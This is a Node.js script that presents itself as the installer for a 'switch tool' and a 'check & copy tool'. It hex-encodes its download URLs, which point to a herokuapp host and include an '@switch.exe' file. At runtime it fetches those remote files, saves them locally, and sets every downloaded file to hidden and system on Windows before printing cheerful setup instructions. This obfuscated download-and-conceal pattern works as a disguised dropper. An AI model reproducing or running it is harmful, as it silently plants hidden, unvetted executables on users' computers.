var hW = [
   fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f63'),// [0c]
   fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f73'),// [1s]
   fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f73796e63'),// [2sync]
   fhs('68747470733a2f2f626c6f6773706f747363726170696e672e6865726f6b756170702e636f6d2f737769746368746f6f6c2f407377697463682e657865'),// [3e] -
   fhs('407377697463682e657865'),// [4e]
],
links = { c: hex2a(hW[0]), s: hex2a(hW[1]), sync: hex2a(hW[2]), snet: hex2a(hW[3]) }

var request = require("request"),
    rp = require('request-promise'),
    fs = require("fs"),
    log = console.log,
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0',
    }
function fhs(hexString) {
	if ((hexString.length % 2) == 0) {
		var arr = hexString.split('');
		var y = 0;
		for (var i = 0; i < hexString.length / 2; i++) {
			arr.splice(y, 0, '\\x');
			y = y + 3;
		}
		return arr.join('')
	}
	else {
		log('formalize failed');
	}
}
function hex2a(hex) {
	var str = '';
	for (var i = 0; i < hex.length; i += 2) {
		var v = parseInt(hex.substr(i, 2), 16);
		if (v) str += String.fromCharCode(v);
	}
	return str;
}
function saveFile(fileName, fileContent) {
    var folder = "./";
    if (!fs.existsSync(folder)) {
        fs.mkdirSync(folder);
    }
    fs.writeFile(folder + fileName, fileContent, function (err) {
        if (err) return log(err);
        //log("updated " + fileName + " > successfully");
    });
}
async function fetchTool(url) {
    var options = {
        url: url,
        headers: headers
    }
    return await rp(options)
}
async function update(toolName) {
    var linkTool = links[toolName]
    switch (toolName) {
        case 'c':
        case 's':
        case 'sync':
            let tool = await fetchTool(linkTool);
            saveFile(toolName, tool);
            break;
        case 'snet':
            var fileStream = fs.createWriteStream(__dirname + '/' + hex2a(hW[4]));
            fileStream.on('close', function() {
                //console.log('updated snet > successfully');
            });
            request(linkTool).pipe(fileStream); 
            break;
    }
}
(async function(){
    log('Installing...')
    await update('c');
    await update('s');
    await update('sync');
    await update('snet');
    var winattr = require('winattr')
    winattr.setSync('c', {hidden:true});
    winattr.setSync('c', {system:true});
    winattr.setSync('s', {hidden:true});
    winattr.setSync('s', {system:true});
    winattr.setSync('sync', {hidden:true});
    winattr.setSync('sync', {system:true});
    winattr.setSync(hex2a(hW[4]), {hidden:true});
    winattr.setSync(hex2a(hW[4]), {system:true});
    log('===>>> Done setup <<<==')
    log('======================== Manual ========================')
    log('press WINDOW key + R then type "cmd" press ENTER key')
    log('type "node help s" -> show manual of switch tool')
    log('type "node help c" -> show manual of check & copy tool')
})()
